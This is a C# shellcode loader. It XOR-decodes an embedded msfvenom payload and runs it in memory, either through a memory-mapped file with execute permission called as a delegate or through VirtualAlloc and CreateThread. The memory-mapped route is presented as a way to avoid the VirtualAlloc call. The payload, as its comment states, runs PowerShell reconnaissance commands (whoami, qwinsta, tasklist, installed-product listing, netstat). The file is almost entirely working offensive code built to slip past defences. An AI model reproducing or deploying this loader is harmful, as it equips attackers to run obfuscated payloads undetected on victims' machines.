using System;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;
using System.Text;

namespace reflect
{
    class Emu
    {
        // DLL function imports 
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualFree(
            IntPtr lpAddress,
            uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds);

        // Delegate declaration for Dinvoke()
        delegate void Reflection();

        static void Dinvoke(byte[] buffer)
        {
            // source for MemoryMappedFile technique to avoid VirtualAlloc(): https://atom0s.com/posts/2017/2017-04-30-executing-shellcode-in-c%23/
            unsafe
            {
                // Creates space in memory "__buffer" with MemoryFile and writes shellcode via FileViewAccessor
                MemoryMappedFile MemoryFile = MemoryMappedFile.CreateNew("__buffer", buffer.Length, MemoryMappedFileAccess.ReadWriteExecute);
                MemoryMappedViewAccessor FileViewAccessor = MemoryFile.CreateViewAccessor(0, buffer.Length, MemoryMappedFileAccess.ReadWriteExecute);
                FileViewAccessor.WriteArray(0, buffer, 0, buffer.Length);

                // getting pointer for our space in memory
                var MemoryPointer = (byte*)0;
                FileViewAccessor.SafeMemoryMappedViewHandle.AcquirePointer(ref MemoryPointer);

                // Marshal Delegate declaration
                var reflection = (Reflection)Marshal.GetDelegateForFunctionPointer(new IntPtr(MemoryPointer), typeof(Reflection));
                reflection();

                VirtualFree((IntPtr)MemoryPointer, 0, 0x8000);
            }


            return;
        }

        static void KernelReflect(byte[] buffer)
        {
            uint ThreadID;

            // Uses all kernel32 methods to allocate and run shellcode with a marshal used to move code
            IntPtr MemoryPointer = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(buffer.Length), 0x1000, 0x40);
            Marshal.Copy(buffer, 0x0, MemoryPointer, buffer.Length);
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, MemoryPointer, IntPtr.Zero, 0, out ThreadID);

            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }
        static void Main(string[] args)
        {
            // msfvenom -a x64 --platform windows -p windows/x64/exec cmd='powershell "whoami /groups;qwinsta;tasklist;get-wmiobject Win32_product;netstat -ano;echo ''press enter to close...'';exit"' -f csharp -v buffer
            // XORed with key 0xfa
            byte[] buffer = new byte[387] {
            0x06,0xb2,0x79,0x1e,0x0a,0x12,0x3a,0xfa,0xfa,0xfa,0xbb,0xab,0xbb,
            0xaa,0xa8,0xab,0xac,0xb2,0xcb,0x28,0x9f,0xb2,0x71,0xa8,0x9a,0xb2,
            0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb2,0x71,0x88,0xaa,0xb2,0xf5,
            0x4d,0xb0,0xb0,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,0x56,0xc6,0x9b,0x86,
            0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0x18,0x17,0xa8,
            0xbb,0xab,0xb2,0x71,0xa8,0xda,0x71,0xb8,0xc6,0xb2,0xfb,0x2a,0x71,
            0x7a,0x72,0xfa,0xfa,0xfa,0xb2,0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,
            0xaa,0x71,0xb2,0xe2,0xbe,0x71,0xba,0xda,0xb3,0xfb,0x2a,0x19,0xac,
            0xb2,0x05,0x33,0xbb,0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb7,0xcb,0x33,
            0xb2,0xcb,0x3a,0x56,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0xc2,0x1a,
            0x8f,0x0b,0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,
            0xbe,0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,
            0x71,0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,0x2a,
            0xbb,0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,0xbb,0xa0,
            0xb2,0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,0xa3,0xa0,0xb2,
            0x71,0xe8,0x13,0xad,0x05,0x05,0x05,0xa7,0xb2,0x40,0xfb,0xfa,0xfa,
            0xfa,0xfa,0xfa,0xfa,0xfa,0xb2,0x77,0x77,0xfb,0xfb,0xfa,0xfa,0xbb,
            0x40,0xcb,0x71,0x95,0x7d,0x05,0x2f,0x41,0x1a,0xe7,0xd0,0xf0,0xbb,
            0x40,0x5c,0x6f,0x47,0x67,0x05,0x2f,0xb2,0x79,0x3e,0xd2,0xc6,0xfc,
            0x86,0xf0,0x7a,0x01,0x1a,0x8f,0xff,0x41,0xbd,0xe9,0x88,0x95,0x90,
            0xfa,0xa3,0xbb,0x73,0x20,0x05,0x2f,0x8a,0x95,0x8d,0x9f,0x88,0x89,
            0x92,0x9f,0x96,0x96,0xda,0xd8,0x8d,0x92,0x95,0x9b,0x97,0x93,0xda,
            0xd5,0x9d,0x88,0x95,0x8f,0x8a,0x89,0xc1,0x8b,0x8d,0x93,0x94,0x89,
            0x8e,0x9b,0xc1,0x8e,0x9b,0x89,0x91,0x96,0x93,0x89,0x8e,0xc1,0x9d,
            0x9f,0x8e,0xd7,0x8d,0x97,0x93,0x95,0x98,0x90,0x9f,0x99,0x8e,0xda,
            0xad,0x93,0x94,0xc9,0xc8,0xa5,0x8a,0x88,0x95,0x9e,0x8f,0x99,0x8e,
            0xc1,0x94,0x9f,0x8e,0x89,0x8e,0x9b,0x8e,0xda,0xd7,0x9b,0x94,0x95,
            0xc1,0x9f,0x99,0x92,0x95,0xda,0x8a,0x88,0x9f,0x89,0x89,0xda,0x9f,
            0x94,0x8e,0x9f,0x88,0xda,0x8e,0x95,0xda,0x99,0x96,0x95,0x89,0x9f,
            0xd4,0xd4,0xd4,0xc1,0x9f,0x82,0x93,0x8e,0xd8,0xfa
            };

            for (int i = 0; i < buffer.Length; i++)
            {
                buffer[i] = (byte)((uint)buffer[i] ^ 0xfa);
            }

            if (args.Length == 0)
            {
                Dinvoke(buffer);
            }
            else if (args[0] == "-d" || args[0] == "--dinvoke")
            {
                Dinvoke(buffer);
            }
            else if (args[0] == "-k" || args[0] == "--kernel")
            {
                KernelReflect(buffer);
            }
            else if (args[0] == "-h" || args[0] == "--help")
            {
                Console.WriteLine("please run the binary with a valid input! ");
                Console.WriteLine("'-d' or '--dinvoke' to run Delegate Reflection [default], or '-k' or '--kernel' to run Reflection via kernel32.dll");
            }
            else
            {
                Console.WriteLine("Invalid input! " + args[0]);
            }

            //Console.Write("Press enter to close the window... ");
            //Console.ReadLine();
        }
    }
}
